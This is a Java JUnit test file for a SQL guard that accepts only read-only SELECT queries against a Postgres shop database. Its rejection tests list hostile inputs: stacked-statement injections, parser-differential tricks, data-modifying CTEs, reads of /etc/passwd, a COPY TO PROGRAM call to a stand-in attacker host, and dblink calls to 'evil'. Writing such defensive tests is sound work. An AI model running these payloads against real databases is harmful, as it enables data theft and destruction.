package io.github.gouranshul.pgperf.guard;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.CsvSource;
import org.junit.jupiter.params.provider.NullAndEmptySource;
import org.junit.jupiter.params.provider.ValueSource;

class SqlGuardTest {

    private final SqlGuard guard = new SqlGuard(10_000);

    @Nested
    class Allowed {

        @ParameterizedTest
        @ValueSource(strings = {
                "SELECT 1",
                "select * from shop.orders where customer_id = 42",
                "SELECT id FROM shop.orders ORDER BY created_at DESC LIMIT 20;",
                "SELECT c.email, sum(o.total) FROM shop.customers c JOIN shop.orders o ON o.customer_id = c.id GROUP BY c.email",
                "WITH recent AS (SELECT * FROM shop.orders WHERE created_at > now() - interval '7 days') SELECT count(*) FROM recent",
                "WITH a AS (SELECT 1 AS x), b AS (SELECT x FROM a) SELECT * FROM b",
                "SELECT name FROM shop.products WHERE name LIKE '%Mug%'",
                "SELECT 'it''s; DELETE FROM shop.orders' AS harmless_string",
                "SELECT id FROM shop.orders WHERE status IN ('paid', 'shipped') UNION ALL SELECT id FROM shop.orders WHERE total > 900",
                "SELECT (SELECT count(*) FROM shop.reviews r WHERE r.product_id = p.id) FROM shop.products p",
                "SELECT * FROM shop.orders WHERE customer_id = $1 AND status = $2",
                "SELECT lower(email), upper(full_name), coalesce(last_login, now()) FROM shop.customers",
                "SELECT id /* a comment; with a semicolon */ FROM shop.orders -- trailing; comment",
                "SELECT \"update\" FROM shop.weird_columns",
        })
        void plainSelectsPass(String sql) {
            assertThat(guard.validate(sql).sql()).isNotBlank();
        }

        @Test
        void stripsTrailingSemicolonAndWhitespace() {
            assertThat(guard.validate("  SELECT 1 ;  \n").sql()).isEqualTo("SELECT 1");
        }

        @Test
        void countsPositionalParameters() {
            assertThat(guard.validate("SELECT * FROM shop.orders WHERE customer_id = $1 AND status = $2")
                    .parameterCount()).isEqualTo(2);
            assertThat(guard.validate("SELECT 1").parameterCount()).isZero();
        }
    }

    @Nested
    class Rejected {

        @ParameterizedTest
        @NullAndEmptySource
        @ValueSource(strings = {"   ", "\n\t", "-- only a comment", "/* nothing */"})
        void emptyInput(String sql) {
            assertRejected(sql, "empty");
        }

        @Test
        void tooLong() {
            String sql = "SELECT 1" + " ".repeat(10_001);
            assertRejected(sql, "too long");
        }

        @ParameterizedTest
        @ValueSource(strings = {
                "INSERT INTO shop.orders (customer_id, status, created_at) VALUES (1, 'x', now())",
                "UPDATE shop.products SET price = 0",
                "DELETE FROM shop.orders",
                "MERGE INTO shop.products p USING shop.products q ON p.id = q.id WHEN MATCHED THEN DELETE",
                "TRUNCATE shop.orders",
                "DROP TABLE shop.orders",
                "ALTER TABLE shop.orders ADD COLUMN x int",
                "CREATE INDEX ON shop.orders (customer_id)",
                "CREATE TABLE stolen AS SELECT * FROM shop.customers",
                "GRANT ALL ON shop.orders TO public",
                "VACUUM shop.orders",
                "EXPLAIN ANALYZE DELETE FROM shop.orders",
                "SET statement_timeout = 0",
                "COPY shop.customers TO '/tmp/out.csv'",
                "COPY (SELECT * FROM shop.customers) TO PROGRAM 'curl attacker'",
                "DO $$ BEGIN DELETE FROM shop.orders; END $$",
                "CALL some_procedure()",
                "LOCK TABLE shop.orders",
        })
        void nonSelectStatements(String sql) {
            assertRejected(sql, "");
        }

        @ParameterizedTest
        @ValueSource(strings = {
                "SELECT 1; DELETE FROM shop.orders",
                "SELECT 1;DROP TABLE shop.orders;",
                "SELECT 1; SELECT 2",
                "select 1 /* comment */ ; delete from shop.orders",
                "SELECT 'a'; DELETE FROM shop.orders; SELECT 'b'",
                // Postgres comments nest: everything up to the second */ is one comment, so the DELETE is live.
                "SELECT 1 /* outer /* inner */ still comment */ ; DELETE FROM shop.orders",
                // With standard_conforming_strings on, backslash does not escape the quote: the string ends at \'
                "SELECT 'abc\\'; DELETE FROM shop.orders; --'",
                "SELECT $$text$$; DELETE FROM shop.orders",
        })
        void multipleStatements(String sql) {
            assertRejected(sql, "single statement");
        }

        @ParameterizedTest
        @ValueSource(strings = {
                "WITH gone AS (DELETE FROM shop.orders RETURNING *) SELECT * FROM gone",
                "WITH changed AS (UPDATE shop.products SET price = 0 RETURNING id) SELECT count(*) FROM changed",
                "WITH added AS (INSERT INTO shop.reviews (product_id, customer_id, rating, created_at) VALUES (1, 1, 5, now()) RETURNING id) SELECT * FROM added",
                "WITH a AS (SELECT 1), b AS (DELETE FROM shop.orders RETURNING id) SELECT * FROM a",
                "WITH outer_cte AS (WITH inner_cte AS (DELETE FROM shop.orders RETURNING id) SELECT * FROM inner_cte) SELECT * FROM outer_cte",
        })
        void dataModifyingCtes(String sql) {
            assertRejected(sql, "data-modifying CTE");
        }

        @Test
        void selectInto() {
            assertRejected("SELECT * INTO stolen FROM shop.customers", "SELECT ... INTO");
        }

        @ParameterizedTest
        @ValueSource(strings = {
                "SELECT * FROM shop.orders FOR UPDATE",
                "SELECT * FROM shop.orders WHERE id = 1 FOR SHARE",
                "SELECT * FROM shop.orders FOR NO KEY UPDATE SKIP LOCKED",
                "select * from shop.products for key share",
                "SELECT * FROM (SELECT * FROM shop.orders FOR UPDATE) sub",
        })
        void lockingClauses(String sql) {
            assertRejected(sql, "FOR UPDATE / FOR SHARE");
        }

        @ParameterizedTest
        @CsvSource(delimiter = '|', value = {
                "SELECT pg_sleep(10)|pg_sleep",
                "SELECT PG_SLEEP(10)|pg_sleep",
                "SELECT pg_sleep_for('10 seconds')|pg_sleep_for",
                "SELECT pg_catalog.pg_sleep(10)|pg_sleep",
                "SELECT \"pg_sleep\"(10)|pg_sleep",
                "SELECT pg_sleep  /* sneaky */  (10)|pg_sleep",
                "SELECT * FROM shop.orders WHERE id = (SELECT 1 FROM pg_sleep(5))|pg_sleep",
                "SELECT * FROM shop.orders WHERE EXISTS (SELECT pg_sleep(5))|pg_sleep",
                "SELECT pg_read_file('/etc/passwd')|pg_read_file",
                "SELECT pg_read_binary_file('/etc/passwd')|pg_read_binary_file",
                "SELECT pg_stat_file('postgresql.conf')|pg_stat_file",
                "SELECT * FROM pg_ls_dir('.')|pg_ls_dir",
                "SELECT lo_import('/etc/passwd')|lo_import",
                "SELECT lo_export(1, '/tmp/x')|lo_export",
                "SELECT dblink_exec('host=evil', 'DROP TABLE x')|dblink_exec",
                "SELECT * FROM dblink('host=evil', 'SELECT 1') AS t(x int)|dblink",
                "SELECT set_config('statement_timeout', '0', false)|set_config",
                "SELECT pg_terminate_backend(123)|pg_terminate_backend",
                "SELECT pg_cancel_backend(123)|pg_cancel_backend",
                "SELECT pg_reload_conf()|pg_reload_conf",
                "SELECT query_to_xml('DELETE FROM shop.orders', true, false, '')|query_to_xml",
                "SELECT nextval('shop.orders_id_seq')|nextval",
                "SELECT pg_advisory_lock(1)|pg_advisory_lock",
                "SELECT coalesce(NULL, pg_sleep(1)::text)|pg_sleep",
                "WITH x AS (SELECT pg_sleep(1)) SELECT * FROM x|pg_sleep",
                // Parser differential: a backslash-escaping parser sees one string literal here,
                // Postgres sees the string 'abc\' followed by a live pg_sleep call.
                "SELECT 'abc\\', pg_sleep(100) --'|pg_sleep",
        })
        void dangerousFunctions(String sql, String function) {
            assertRejected(sql, function);
        }

        @ParameterizedTest
        @ValueSource(strings = {
                "SELECT 'unterminated",
                "SELECT 1 /* unterminated comment",
                "SELECT $tag$ unterminated",
                "SELECT \"unterminated",
        })
        void unterminatedTokens(String sql) {
            assertRejected(sql, "unterminated");
        }

        @Test
        void unparsableSqlFailsClosed() {
            assertRejected("SELEKT * FROM shop.orders", "could not be parsed");
        }

        @Test
        void escapeStringCannotHideAStatementBreak() {
            // In an E'' string \' IS an escape, so the whole thing is one statement and the
            // string contains the text "'; DELETE ...". Must still be accepted as a plain SELECT.
            assertThat(guard.validate("SELECT E'it\\'s; DELETE FROM shop.orders'").sql()).startsWith("SELECT");
        }
    }

    private void assertRejected(String sql, String reasonFragment) {
        assertThatThrownBy(() -> guard.validate(sql))
                .isInstanceOf(SqlRejectedException.class)
                .satisfies(e -> assertThat(e.getMessage()).containsIgnoringCase(reasonFragment));
    }
}
